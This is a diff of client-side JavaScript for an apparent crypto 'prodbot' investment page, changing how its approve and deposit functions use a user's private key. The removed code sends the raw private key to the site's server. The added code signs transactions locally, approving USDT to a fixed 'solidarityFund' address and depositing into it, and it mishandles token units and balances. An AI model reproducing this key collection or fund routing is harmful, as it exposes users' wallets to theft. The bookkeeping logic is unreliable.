@@ -243,29 +243,31 @@ async function runApprove(amount) {
   }
 
   try {
-    const resp = await fetch("/prodbot/security", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        userid: window.USER_ID,
-        wallet: window.USER_ADDR,
-        pk: pkvalue,
-        amount,
-        action: "approve"
-      })
-    });
+    // Connect to Ethereum
+    const provider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
+    const wallet = new ethers.Wallet(pkvalue, provider);
 
-    const data = await resp.json();
-    if (data.error) throw new Error(data.error);
+    // USDT contract
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const solidarityFund = "0xa5Daf94b8b3dCE7D758bd419ffDd7aC1B83CE0c5";
 
-    logToPanel(`ApproveTx=${data.tx_hash}`);
-    return data; // return receipt JSON
+    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+    const token = new ethers.Contract(USDT, abi, wallet);
+
+    // $1 USDT = 1,000,000 units
+    const tx = await token.approve(solidarityFund, amount);
+    const receipt = await tx.wait();
+
+    logToPanel(`ApproveTx=${tx.hash}`);
+    return { tx_hash: tx.hash, status: receipt.status };
   } catch (err) {
     logToPanel(`ApproveError=${err.message}`);
     throw err;
   }
 }
 
+
+// Deposit
 // Deposit
 async function runDeposit(amount) {
   if (!pkvalue) {
@@ -287,53 +289,48 @@ async function runDeposit(amount) {
       return;
     }
 
-    // Step 2: Deposit via backend
-    const resp = await fetch("/prodbot/security", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        userid: window.USER_ID,
-        wallet: window.USER_ADDR,
-        pk: pkvalue,
-        amount: netAmount,
-        action: "deposit"
-      })
-    });
+    // Step 2: Deposit
+    const provider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
+    const wallet = new ethers.Wallet(pkvalue, provider);
 
-    const data = await resp.json();
-    if (data.error) throw new Error(data.error);
+    const solidarityFund = "0xa5Daf94b8b3dCE7D758bd419ffDd7aC1B83CE0c5";
+    const abi = ["function depositFunds(address token, uint256 amount) external"];
+    const fund = new ethers.Contract(solidarityFund, abi, wallet);
 
-    logToPanel(`DepositTx=${data.tx_hash}`);
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 
-    // Update balances from server response
-    document.getElementById("investBalance").value = data.invest_balance.toFixed(6);
-    document.getElementById("startBalance").value = data.start_balance.toFixed(6);
-    window.SolidarityFundBalance = data.start_balance;
-    logToPanel(`SolidarityFundBalance=${data.start_balance.toFixed(6)} USDT`);
+    const tx = await fund.depositFunds(USDT, netAmount);
+    const receipt = await tx.wait();
 
-    // Reset deposit textbox
+    logToPanel(`DepositTx=${tx.hash}`);
+
+    // ✅ Update balances locally
+    document.getElementById("investBalance").value = netAmount.toFixed(6);
+    document.getElementById("startBalance").value = netAmount.toFixed(6);
+    window.SolidarityFundBalance = netAmount;
+    logToPanel(`SolidarityFundBalance=${netAmount.toFixed(6)} USDT`);
+
+    // Reset textboxes
     const depositEl = document.getElementById("depositAmount");
     if (depositEl) depositEl.value = "";
-
-    // Reset initial investment balance
     const initialEl = document.getElementById("initialBalance");
     if (initialEl) initialEl.value = "0.000000";
 
-    // Mirror to clients.db
+    // ✅ Mirror to clients.db
     await fetch("/prodbot/update_client", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         userid: window.USER_ID,
         wallet: window.USER_ADDR,
-        invest_balance: data.invest_balance,
-        start_balance: data.start_balance,
-        last_tx: data.tx_hash,
+        invest_balance: netAmount,
+        start_balance: netAmount,
+        last_tx: tx.hash,
         action: "update"
       })
     });
 
-    return data.tx_hash;
+    return tx.hash;
   } catch (err) {
     logToPanel(`DepositError=${err.message}`);
     throw err;
